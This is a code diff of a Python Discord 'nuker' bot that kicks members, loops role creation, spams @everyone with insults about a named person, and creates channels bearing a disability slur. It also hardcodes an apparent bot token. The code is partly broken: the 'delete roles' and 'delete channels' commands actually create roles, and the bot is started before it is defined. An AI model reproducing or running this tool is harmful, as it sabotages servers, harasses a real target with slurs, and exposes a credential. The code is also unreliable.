@@ -1,3 +1,11 @@
+# nuke_uwu #
+#---------------------------------#
+# Multi-function Discord Nuker bot coded in Python #
+# Version: v1.0.2 #
+# By: Dante + Sreud #
+# Github Repo: https://github.com/cdantetho/nuke_uwu #
+#---------------------------------#
+
 import discord
 from discord.ext.commands import *
 from discord.ext import commands
@@ -16,20 +24,35 @@ import sys
 import traceback
 import json
 from discord.utils import get
-#Nuke_uwu v1.0.1#
  
-##PREFIX##
 
-bot = commands.Bot(command_prefix='!')
 
-client = commands.Bot(command_prefix='!')
 
-##OTHER##
+
+
+## --                    -- ##
+## --   INITIALIZATION   -- ##
+## --                    -- ##
+
+
+
+## -- SET BOT APPLICATION TOKEN -- ##
+bot.run ("NTk3Nzk1NzgyMTk1OTM3Mjgw.XSNqYA.r6AMd7GMUKYQagIItjDCJgL7kOc")
+
+
+
+## -- SET BOT COMMAND PREFIX -- ##
+bot = commands.Bot(command_prefix='&&')
+client = commands.Bot(command_prefix='&&')
+
+
+
+## -- OTHER -- ##
 bot.remove_command('help')
 
 
 
-##BOT IS READY##
+## -- BOT IS READY -- ##
 @bot.event
 async def on_ready():
 #BOT STATUS#
@@ -38,7 +61,17 @@ async def on_ready():
 
 
 
-##KICKCOMMAND##(!kick)
+
+
+
+## --              -- ##
+## --   COMMANDS   -- ##
+## --              -- ##
+
+
+
+## -- KICK -- ##
+#Command: !kick #
 @bot.command(pass_context=True)
 async def kick(ctx, member : discord.Member):
     await member.kick()
@@ -46,14 +79,16 @@ async def kick(ctx, member : discord.Member):
 
 
 
-##KICKALLCOMMAND##(!kall)
+## -- KICK ALL -- ##
+#Command: !kall #
 @bot.command(pass_context=True)
 async def kall(member : discord.Member):
     await member.kick()
 
 
- 
-##SPAM COMMAND##(!spam)
+
+## -- SPAM MESSAGE -- ##
+#Command: !spam #
 @bot.command(pass_context=True)
 async def spam(ctx): #run "!spam" to run the command
     await ctx.message.delete()
@@ -93,10 +128,11 @@ async def spam(ctx): #run "!spam" to run the command
         await ctx.send("@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.\n@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.")
         await ctx.send("@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.\n@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.")
         await ctx.send("@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.\n@everyone, Russian jumps from female to female way to quick. he also cannot spell, for example when he wrote 'Happyness' instead of 'Happiness'.")
-        
-        
-        
-##SPAM ROLE##(!roles)
+
+
+
+## -- SPAM CREATE ROLES -- ##
+#Command: !roles #
 @bot.command(pass_context=True)
 async def roles(ctx):
     await ctx.message.delete()
@@ -106,24 +142,25 @@ async def roles(ctx):
 
 
 
-##REPLACE ROLES##(!rr)
+## -- DELETE ALL ROLES -- ##
+#Command: !delroles #
 @bot.command(pass_context=True)
+async def delroles(ctx):
+    await ctx.message.delete()
+    while True:
+        guild = ctx.guild
+        await guild.create_role(name="Role Spam is fun")
 
 
 
-
-
-##DELETE CHANNELS##(!del)
-
-
-
-
-
-
-
-
-
-
+## -- REMOVE ALL CHANNELS -- ##
+#Command: !delchannels #
+@bot.command(pass_context=True)
+async def delchannels(ctx):
+    await ctx.message.delete()
+    while True:
+        guild = ctx.guild
+        await guild.create_role(name="Role Spam is fun")
 
 
 
@@ -2559,8 +2596,3 @@ async def channels(ctx):
     await guild.create_text_channel('Russian is autistic')
     await guild.create_text_channel('Russian is autistic')    
     await guild.create_text_channel('Russian is autistic')
-
-
-    
-##BOT TOKEN##
-bot.run ("NTk3Nzk1NzgyMTk1OTM3Mjgw.XSNqYA.r6AMd7GMUKYQagIItjDCJgL7kOc")
